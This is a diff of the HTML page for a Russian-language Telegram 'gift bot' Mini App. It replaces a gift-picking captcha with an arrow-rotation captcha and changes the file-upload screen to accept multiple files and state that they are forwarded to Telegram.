@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🎁 Подарочный бот - Mini App</title>
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <link rel="stylesheet" href="style.css?v=2">
+    <link rel="stylesheet" href="style.css?v=4">
 </head>
 <body>
     <!-- Фон с вращающимися фото -->
@@ -15,22 +15,19 @@
     <div class="screen" id="captchaScreen">
         <div class="container">
             <div class="icon">🔒</div>
-            <h1>Проверка безопасности</h1>
-            <p class="subtitle">Нажмите на <span class="gift-count">3 подарка</span> 🎁</p>
+            <h1>Подтвердите, что вы человек</h1>
+            <p class="subtitle">Поверните стрелку на 90° вправо</p>
             
-            <div class="captcha-grid" id="captchaGrid">
-                <!-- Капча будет создана через JS -->
+            <div class="rotate-area">
+                <div class="degree-indicator" id="degreeIndicator">0°</div>
+                <div class="rotate-circle" id="rotateCircle">↑</div>
             </div>
             
-            <div class="counter">
-                Выбрано: <span id="selectedCount">0</span> из 3
-            </div>
-            
-            <button class="btn primary" id="verifyCaptchaBtn" disabled>
-                🔓 Продолжить
+            <button class="btn primary" id="verifyBtn">
+                ✅ Подтвердить
             </button>
             
-            <p class="hint">Выберите все 3 подарка, чтобы продолжить</p>
+            <p class="hint">Простая проверка для защиты от ботов</p>
         </div>
     </div>
     
@@ -42,20 +39,20 @@
             <p class="subtitle" id="userInfo"></p>
             
             <button class="btn" id="sendFileBtn">
-                📁 Отправить файл на проверку
+                📤 Отправить файл
             </button>
             
-            <input type="file" id="fileInput" class="hidden">
+            <input type="file" id="fileInput" class="hidden" multiple>
             
             <div class="status" id="status"></div>
             
             <p class="hint">
-                Файл будет проверятся в течении 3-5 минут
+                Файл будет переслан в Telegram
             </p>
         </div>
     </div>
     
     <script src="https://telegram.org/js/telegram-web-app.js?v=1"></script>
-    <script src="script.js?v=2"></script>
+    <script src="script.js?v=4"></script>
 </body>
 </html>
